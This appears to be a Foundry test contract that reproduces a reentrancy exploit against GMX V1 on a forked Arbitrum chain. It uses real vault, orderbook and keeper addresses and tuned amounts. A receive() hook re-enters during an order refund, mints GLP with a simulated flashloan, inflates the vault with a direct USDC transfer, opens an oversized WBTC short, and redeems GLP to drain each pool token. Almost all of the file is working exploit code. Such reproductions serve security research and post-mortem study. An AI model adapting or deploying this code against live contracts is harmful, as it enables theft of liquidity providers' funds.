// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";
import "../GMXInterfaces/IGLPManager.sol";
import "../GMXInterfaces/IGMXOrderbookV1.sol";
import "../GMXInterfaces/IGMXPositionManagerV1.sol";
import "../GMXInterfaces/IGMXRouter.sol";
import "../GMXInterfaces/IGMXRewardRouterV2.sol";
import "../GMXInterfaces/IGMXVaultV1.sol";

contract GMXEXPNewTry is BaseTestWithBalanceLog {
    // --- Constants ---
    address public constant GMX_VAULT_V1 = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address public constant GMX_ORDERBOOK_V1 = 0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB;
    address public constant GMX_POSITION_MANAGER_V1 = 0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C;
    address public constant GMX_ROUTER_V1 = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address public constant GMX_REWARD_ROUTER_V2 = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
    address public constant GMX_GLPMANAGER = 0x3963FfC9dff443c2A94f21b129D429891E32ec18;

    address public GMX_KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;

    // Token addresses on Arbitrum One
    address public constant FRAX = 0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F;
    address public constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address public constant USDT = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9; // Note: This appears to be USD₮0 based on your image
    address public constant DAI = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;
    address public constant USDC_BRIDGED = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8; // Bridged USDC
    address public constant UNI = 0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0;
    address public constant LINK = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
    address public constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;

    // Array of all token addresses for easy iteration
    address[] public tokenAddresses = [FRAX, USDC, USDT, DAI, USDC_BRIDGED, UNI, LINK, WETH, WBTC];

    address[] public unstakeAssets = [WBTC, WETH, USDC_BRIDGED, LINK, UNI, USDT, FRAX, DAI];

    IGMXVaultV1 public gmxVault = IGMXVaultV1(payable(GMX_VAULT_V1));
    IGMXOrderBookV1 public gmxOrderBook = IGMXOrderBookV1(payable(GMX_ORDERBOOK_V1));
    IGMXPositionManagerV1 public gmxPositionManger = IGMXPositionManagerV1(payable(GMX_POSITION_MANAGER_V1));
    IGMXRewardRouterV2 public gmxRewardRouter = IGMXRewardRouterV2(payable(GMX_REWARD_ROUTER_V2));
    IGLPManager public glpManger = IGLPManager(GMX_GLPMANAGER);
    IGMXRouter public gmxRouter = IGMXRouter(payable(GMX_ROUTER_V1));

    // --- Structs ---
    struct OrderParams {
        // Common
        address account;
        uint256 orderIndex;
        address collateralToken;
        uint256 collateralDelta; // For increase: 0 or amountIn, for decrease: actual collateralDelta
        address indexToken;
        uint256 sizeDelta;
        bool isLong;
        uint256 triggerPrice;
        bool triggerAboveThreshold;
        uint256 executionFee;
        // Increase-specific
        uint256 ethInitOrder; // ETH sent to create order (for increase)
        bool isIncrease; // true for increase, false for decrease
    }

    // Increase order: 0.1003 ETH, sizeDelta = 531.064 * 1e30, triggerPrice = 1500 * 1e30, execFee = 0.0003 ETH
    OrderParams public increaseOrderParams;
    // Decrease order: collateralDelta = 26.5171336 * 1e27, sizeDelta = 53.1064 * 1e30, triggerPrice = 1500 * 1e30, execFee = 0.0003 ETH
    OrderParams public decreaseOrderParams;

    uint256 USDC_FLASHLOAN_AMT = 7_538_567_619_570;
    uint256 USDC_DIRECT_TRANSFER_TO_VAULT_AMT = 1_538_567_619_570;
    uint256 USDC_GLPMINT_AMT = 6_000_000_000_000;

    uint256 WBTC_SHORT_SIZEDELTA = 15_385_676_195_700_000_000_000_000_000_000_000_000;

    uint256 shortsizedelta;

    constructor() {}

    struct Exit {
        address token;
        uint256 maxOut; // raw token amount we would receive
        uint256 usdValue; // maxOut * minPrice (18 dec)
        uint256 glpNeeded; // exact GLP to burn
    }

    receive() external payable {
        if (msg.sender == GMX_ORDERBOOK_V1) {
            _flashloanUSDC();
        }
    }
    // --- Setup ---
    // ============ Balance Logging ============

    // Tokens to track for balance logging
    address[] public trackedTokens = [FRAX, USDC, USDT, DAI, USDC_BRIDGED, UNI, LINK, WETH, WBTC];

    modifier balanceLogNew() {
        logAllBalances("Before");
        _;
        logAllBalances("After");
    }

    function logAllBalances(
        string memory stage
    ) internal {
        // Log ETH balance
        emit log_named_decimal_uint(
            string(abi.encodePacked("ETH Balance ", stage, " exploit")), address(this).balance, 18
        );

        // Log all token balances
        for (uint256 i = 0; i < trackedTokens.length; i++) {
            address token = trackedTokens[i];
            uint256 balance = TokenHelper.getTokenBalance(token, address(this));
            uint8 decimals = _getTokenDecimals(token);
            string memory symbol = _getTokenSymbol(token);

            emit log_named_decimal_uint(
                string(abi.encodePacked(symbol, " Balance ", stage, " exploit")), balance, decimals
            );
        }

        // Log GLP balances
        address glpToken = gmxRewardRouter.glp();
        address stakedGLP = 0x1aDDD80E6039594eE970E5872D247bf0414C8903; // fsGLP

        emit log_named_decimal_uint(
            string(abi.encodePacked("GLP Balance ", stage, " exploit")), IERC20(glpToken).balanceOf(address(this)), 18
        );

        emit log_named_decimal_uint(
            string(abi.encodePacked("Staked GLP Balance ", stage, " exploit")),
            IERC20(stakedGLP).balanceOf(address(this)),
            18
        );

        // Log total USD value
        uint256 totalUSDValue = calculateTotalUSDValue();
        emit log_named_decimal_uint(string(abi.encodePacked("Total USD Value ", stage, " exploit")), totalUSDValue, 18);
    }

    function calculateTotalUSDValue() internal view returns (uint256) {
        uint256 totalValue = 0;

        // Calculate value of all tokens
        for (uint256 i = 0; i < trackedTokens.length; i++) {
            address token = trackedTokens[i];
            uint256 balance = IERC20(token).balanceOf(address(this));
            if (balance > 0) {
                uint256 price = gmxVault.getMinPrice(token);
                uint256 decimals = gmxVault.tokenDecimals(token);
                uint256 tokenValueUSD = (balance * price) / (10 ** decimals);
                totalValue += tokenValueUSD;
            }
        }

        // Add GLP value
        address stakedGLP = 0x1aDDD80E6039594eE970E5872D247bf0414C8903;
        uint256 stakedGLPBalance = IERC20(stakedGLP).balanceOf(address(this));
        if (stakedGLPBalance > 0) {
            address glpToken = glpManger.glp();
            uint256 glpSupply = IERC20(glpToken).totalSupply();
            uint256 aumInUsdg = glpManger.getAumInUsdg(false);
            uint256 glpValueUSD = (stakedGLPBalance * aumInUsdg) / glpSupply;
            totalValue += glpValueUSD;
        }

        return totalValue;
    }

    function _getTokenDecimals(
        address token
    ) internal view returns (uint8) {
        if (token == WETH || token == FRAX || token == DAI || token == LINK || token == UNI) return 18;
        if (token == USDC || token == USDC_BRIDGED || token == USDT) return 6;
        if (token == WBTC) return 8;
        return 18; // default
    }

    function _getTokenSymbol(
        address token
    ) internal pure returns (string memory) {
        if (token == FRAX) return "FRAX";
        if (token == USDC) return "USDC";
        if (token == USDT) return "USDT";
        if (token == DAI) return "DAI";
        if (token == USDC_BRIDGED) return "USDC.e";
        if (token == UNI) return "UNI";
        if (token == LINK) return "LINK";
        if (token == WETH) return "WETH";
        if (token == WBTC) return "WBTC";
        return "UNKNOWN";
    }

    /**
     * @notice Manual balance logging function
     */
    function logCurrentBalances(
        string memory stage
    ) external {
        logAllBalances(stage);
    }

    // ============ Events for Logging ============

    function setUp() public {
        vm.createSelectFork("arbitrum", 355_880_237 - 1);
        // --- Order Parameter Variables ---

        // Set up increase order params
        increaseOrderParams = OrderParams({
            account: address(this),
            orderIndex: 0,
            collateralToken: WETH,
            collateralDelta: 0, // Not used for increase
            indexToken: WETH,
            sizeDelta: 531_064_000_000_000_000_000_000_000_000_000, // 531.064 in 1e30 precision
            isLong: true,
            triggerPrice: 1_500_000_000_000_000_000_000_000_000_000_000, // 1500 * 1e30 precison
            triggerAboveThreshold: true,
            executionFee: 0.0003 ether, // 0.0003 ether
            ethInitOrder: 0.1 ether, // 0.1003 ether
            isIncrease: true
        });

        // Set up decrease order params
        decreaseOrderParams = OrderParams({
            account: address(this),
            orderIndex: 0,
            collateralToken: WETH,
            collateralDelta: 26_517_133_600_000_000_000_000_000_000_000, // 26.5171336 * 1e27 (leave as is, not a round 1eX)
            indexToken: WETH,
            sizeDelta: 53_106_400_000_000_000_000_000_000_000_000, // 53.1064 * 1e30 (leave as is, not a round 1eX)
            isLong: true,
            triggerPrice: 1500 * 1e30, // 1500 * 1e30
            triggerAboveThreshold: true,
            executionFee: 0.0003 ether, // 0.0003 ether
            ethInitOrder: 0, // Not used for decrease
            isIncrease: false
        });
    }

    // --- Test Entry Point ---
    function test_GMXEXPNewTry() public balanceLogNew {
        //Approve position router
        gmxRouter.approvePlugin(GMX_REWARD_ROUTER_V2);
        gmxRouter.approvePlugin(GMX_ORDERBOOK_V1);

        _createInitialIncreaseOrder();
        _createInitialDecreaseOrder();
        _executeDecreaseOrderFromKeeper();
    }

    // --- Internal Helpers ---

    function _createInitialIncreaseOrder() internal {
        vm.deal(address(this), increaseOrderParams.ethInitOrder + increaseOrderParams.executionFee);

        address[] memory path = new address[](1);
        path[0] = WETH;

        gmxOrderBook.createIncreaseOrder{value: increaseOrderParams.ethInitOrder + increaseOrderParams.executionFee}(
            path,
            increaseOrderParams.ethInitOrder,
            WETH,
            0,
            increaseOrderParams.sizeDelta,
            WETH,
            increaseOrderParams.isLong,
            increaseOrderParams.triggerPrice,
            increaseOrderParams.triggerAboveThreshold,
            increaseOrderParams.executionFee,
            true
        );
    }

    function _createInitialDecreaseOrder() internal {
        vm.deal(address(this), decreaseOrderParams.executionFee);

        gmxOrderBook.createDecreaseOrder{value: decreaseOrderParams.executionFee}(
            decreaseOrderParams.indexToken,
            decreaseOrderParams.sizeDelta,
            decreaseOrderParams.collateralToken,
            decreaseOrderParams.collateralDelta,
            decreaseOrderParams.isLong,
            decreaseOrderParams.triggerPrice,
            decreaseOrderParams.triggerAboveThreshold
        );
    }

    function _executeDecreaseOrderFromKeeper() internal {
        vm.startPrank(GMX_KEEPER);
        gmxPositionManger.executeIncreaseOrder(address(this), 0, 0xd4266F8F82F7405429EE18559e548979D49160F3);
        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        gmxPositionManger.executeDecreaseOrder(
            address(this),
            0,
            0xd4266F8F82F7405429EE18559e548979D49160F3 // Fee receiver
        );
        vm.stopPrank();
    }

    function _initiateLeveragedReentrancy() internal {
        //First transfer usdc to vault directly to increae value of usdc? idk
        _mintAndStakeInitialGLP();
        TokenHelper.transferToken(USDC, GMX_VAULT_V1, USDC_DIRECT_TRANSFER_TO_VAULT_AMT);
        _createBigShort();
        _extractTheProfit();
        _decreaseShortAndDosomething();
        // _extractTheProfit();
    }

    function _mintAndStakeInitialGLP() internal {
        TokenHelper.approveToken(USDC, GMX_GLPMANAGER, USDC_GLPMINT_AMT);
        gmxRewardRouter.mintAndStakeGlp(USDC, USDC_GLPMINT_AMT, 0, 0);
    }

    function calculateMaxShortFromGLP() internal view returns (uint256) {
        // 1. Get your staked GLP balance
        address stakedGLP = 0x1aDDD80E6039594eE970E5872D247bf0414C8903; // fsGLP
        uint256 stakedGLPBalance = IERC20(stakedGLP).balanceOf(address(this));

        // 2. GLP acts as collateral - get its USD value
        address glpToken = gmxRewardRouter.glp();
        uint256 glpSupply = IERC20(glpToken).totalSupply();
        uint256 aumInUsdg = glpManger.getAumInUsdg(false); // 18 decimals

        // 3. Calculate USD value of your GLP (18 decimals)
        uint256 glpValueUSD = (stakedGLPBalance * aumInUsdg) / glpSupply;

        // 4. For shorts, max leverage is ~30x, so:
        // maxSizeDelta = glpValue * leverage (convert to 30 decimals)
        uint256 leverageNumerator = 220; // 3.15x leverage
        uint256 leverageDenominator = 100;
        uint256 maxSizeDelta = (glpValueUSD * leverageNumerator * 1e12) / leverageDenominator; // Convert 18 decimals to 30
        return maxSizeDelta;
    }

    function _createBigShort() internal {
        shortsizedelta = calculateMaxShortFromGLP();
        gmxVault.increasePosition(address(this), USDC, WBTC, shortsizedelta, false);
    }

    /// @notice Returns the exact GLP you must unstake/redeem to receive
    ///         `tokenAmountOut_` of `tokenOut_`.
    /// @dev    Reads prices from GMX V1 vault and GLP data from GlpManager
    ///         (accessed via RewardRouterV2).
    ///         Uses the *pessimistic* (min) price so the amount is safe.
    function glpNeededForTokenOut(
        address tokenOut_,
        uint256 tokenAmountOut_
    ) internal view returns (uint256 glpNeeded) {
        // 1. price & decimals of the token we want out
        uint256 price = gmxVault.getMinPrice(tokenOut_);
        uint256 decimals = gmxVault.tokenDecimals(tokenOut_);

        // 2. USDG value required to obtain that token amount
        uint256 targetUsdg = tokenAmountOut_ * (price) / (10 ** decimals);

        // 3. current GLP supply (18 decimals)
        address glpToken = gmxRewardRouter.glp();
        uint256 glpSupply = IERC20(glpToken).totalSupply();

        // 4. total AUM expressed in USDG (18 decimals)
        uint256 aumInUsdg = glpManger.getAumInUsdg(false); // pessimistic

        // 5. GLP to burn
        glpNeeded = aumInUsdg == 0 ? 0 : targetUsdg * (glpSupply) / (aumInUsdg);
    }

    function calculateMaxTokenOut(
        address tokenOut_
    ) internal view returns (uint256 glpNeeded, uint256 maxTokenOut) {
        // 1. Get available liquidity for this token
        uint256 poolAmount = gmxVault.poolAmounts(tokenOut_);
        uint256 reservedAmount = gmxVault.reservedAmounts(tokenOut_);
        uint256 availableLiquidity = poolAmount - reservedAmount;

        // 2. Apply safety margin (99.9% of available)
        uint256 maxTokenOut = (availableLiquidity * 999) / 1000;

        // 3. Get token price and decimals
        uint256 price = gmxVault.getMinPrice(tokenOut_);
        uint256 decimals = gmxVault.tokenDecimals(tokenOut_);

        // 4. Convert token amount to USD value
        uint256 usdValue = (maxTokenOut * price) / (10 ** decimals);

        // 5. Convert USD value to GLP needed
        address glpToken = gmxRewardRouter.glp();
        uint256 glpSupply = IERC20(glpToken).totalSupply();
        uint256 aumInUsdg = glpManger.getAumInUsdg(false);

        glpNeeded = (usdValue * glpSupply) / aumInUsdg;

        return (glpNeeded, maxTokenOut);
    }
    
    // function _extractTheProfit() internal  {
    //     uint256 stakedGLPBalance = IERC20(gmxRewardRouter.stakedGlpTracker()).balanceOf(address(this));
    //     uint256 glptouse = stakedGLPBalance / unstakeAssets.length;
    //     uint256[] memory glpAmounts = new uint256[](8);
    //     glpAmounts[0] = 386_498_977_301_112_432_466_652; // WBTC transaction
    //     glpAmounts[1] = 341_596_270_985_668_652_106_658; // WETH transaction
    //     glpAmounts[2] = 7_503_268_381_089_010_018_234; // USDC transaction
    //     glpAmounts[3] = 13_453_659_795_811_394_287_419; // LINK transaction
    //     glpAmounts[4] = 21_422_748_392_865_504_694_138; // UNI transaction
    //     glpAmounts[5] = 53_812_436_696_917_217_624_679; // USDT transaction
    //     glpAmounts[6] = 450_568_243_197_571_194_433_982; // FRAX transaction
    //     glpAmounts[7] = 53_603_497_139_685_496_377_262; // DAI transaction
    //     for (uint256 i = 0; i < unstakeAssets.length; i++) {
    //         // gmxRewardRouter.unstakeAndRedeemGlp(unstakeAssets[i], glpAmounts[i], 0, address(this));
    //         gmxRewardRouter.unstakeAndRedeemGlp(
    //             unstakeAssets[i],
    //             glpNeededForTokenOut(unstakeAssets[i], (TokenHelper.getTokenBalance(unstakeAssets[i], GMX_VAULT_V1) * 1000 / 10000)),
    //             0,
    //             address(this)
    //         );
    //     }
    //     // extractAll(address(this));
    // }

    function _extractTheProfit() internal {
        uint256 stakedGLPBalance = IERC20(gmxRewardRouter.stakedGlpTracker()).balanceOf(address(this));
        uint256 remainingGLP = stakedGLPBalance;

        for (uint256 i = 0; i < unstakeAssets.length && remainingGLP > 0; i++) {
            address token = unstakeAssets[i];

            // Calculate maximum token amount we can extract without error
            uint256 maxTokenOut = calculateMaxExtractableAmount(token);

            if (maxTokenOut > 0) {
                // Calculate exact GLP needed for this amount
                uint256 glpNeeded = glpNeededForTokenOut(token, maxTokenOut);

                // Don't exceed remaining GLP
                if (glpNeeded > remainingGLP) {
                    glpNeeded = remainingGLP;
                }

                if (glpNeeded > 0) {
                    gmxRewardRouter.unstakeAndRedeemGlp(token, glpNeeded, 0, address(this));
                    remainingGLP -= glpNeeded;
                }
            }
        }
    }

    function calculateMaxExtractableAmount(
        address token
    ) internal view returns (uint256) {
        uint256 poolAmount = gmxVault.poolAmounts(token);
        uint256 reservedAmount = gmxVault.reservedAmounts(token);
        uint256 usdgAmount = gmxVault.usdgAmounts(token);

        // Check if we can extract anything at all
        if (poolAmount <= reservedAmount || usdgAmount == 0) return 0;

        // Key insight: when we sellUSDG, it calls _increaseReservedAmount
        // This means: newReservedAmount = oldReservedAmount + extractedTokenAmount
        // The validation is: newReservedAmount <= poolAmount
        // So: oldReservedAmount + extractedTokenAmount <= poolAmount
        // Therefore: extractedTokenAmount <= poolAmount - oldReservedAmount
        uint256 maxByReserveConstraint = poolAmount - reservedAmount;

        // Maximum based on available USDG for this token
        uint256 price = gmxVault.getMinPrice(token);
        uint256 decimals = gmxVault.tokenDecimals(token);
        uint256 maxByUsdgLimit = (usdgAmount * (10 ** decimals)) / price;

        // Take the minimum of both constraints
        uint256 maxExtractable = maxByReserveConstraint < maxByUsdgLimit ? maxByReserveConstraint : maxByUsdgLimit;

        // Apply minimal safety margin to account for any precision/rounding issues in GMX
        // Use 99.9% to maximize extraction while avoiding edge case failures
        return (maxExtractable * 730) / 1000;
    }

    function _decreaseShortAndDosomething() internal {
        gmxVault.decreasePosition(address(this), USDC, WBTC, 0, shortsizedelta, false, address(this));
    }

    function _flashloanUSDC() internal {
        //Flashloan USDC ,we are just gonna deal it in for now
        deal(USDC, address(this), USDC_FLASHLOAN_AMT);
        //We will call initiateleveragedreenttacnt from here cause we arent using uniswap flash but uniswap flash should call in in real
        _initiateLeveragedReentrancy();
    }
}
